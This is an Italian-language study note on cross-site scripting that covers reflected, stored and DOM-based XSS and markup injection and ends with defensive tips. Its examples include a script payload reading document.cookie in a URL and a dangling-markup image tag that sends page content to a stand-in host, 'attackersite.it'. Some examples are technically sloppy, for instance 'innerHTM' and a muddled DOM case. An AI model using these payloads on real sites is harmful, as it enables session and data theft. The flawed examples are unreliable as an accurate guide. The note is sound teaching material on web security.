# XSS ( Cross-site-scripting )


> Cos'e' un attacco di tipo XSS?

Un attaco di tipo XSS e' un attacco che permette di eseguire codice JavaScript dal Client senza un permesso esplicito

> Quali tipi di attacchi XSS esistono?

1. Reflected XSS
2. Stored XSS
3. DOM based XSS

> Reflected XSS

Un attacco di tipo Reflected XSS e' un attacco che si riflette sul Broswer, questo vuol dire che l'attaccante puo' avere un controllo totale sulla sessione corrente ( dello stesso utente )

*Esempio*: 

Url: `https://sitovulnerabile.com/resource/stock/?id=<script>document.cookie</script>`

Questo sito returnera' una response 

Response: `<p>Stock: my-cookie</p>`

> Stored XSS

Un attacco di tipo Stored XSS e' un attacco che si riflette su altri utenti, essendo che lo script viene salvato nelle risorse del sito

*Esempio*:

input-utente: "Lascia un commento: " -> `<script> codice malevolo</script>`

Utente X: Ricarica la pagina e' il codice precedentemente inserito dall'attaccante viene eseguito

> DOM based XSS

Un attacco di tipo DOM based XSS e' un attacco che si riferisce al DOM JavaScript. Questo attacco prevede la sovrascrittura del DOM lato Client

*Esempio*:

input: `<script>element.innerHTM(document.getElementById('username').value)`

Response: `Your username: <h1><script> codice malevolo </script></h1>`


> MarkUp injection

Un attacco di tipo MarkUp injection e' un attacco che viene usato quando non e' possibile eseguire un attacco di tipo XSS, questo porta ad avere degli input non protetti in cui l'attaccante tramite codice html riesce a manipolare il sito

*Esempio*:

input: `type="text" name="input" value="Data"> <img src='http://attackersite.it/content=>`

Nota: non viene chiuso il tag html per poter fare che tutti i tags dopo content= vengano presi come query 



# A cosa puo' portare un attacco di tipo XSS?

1. L'attaccante che accede a dati sensibili di altri utenti
2. Injection di malwares 


# Tips per contrastare questa vulnerabilita'
- Controllare l'input che viene inviato dal client
- Encodare l'url, html, jjs 
- Usare cookie di sicurezza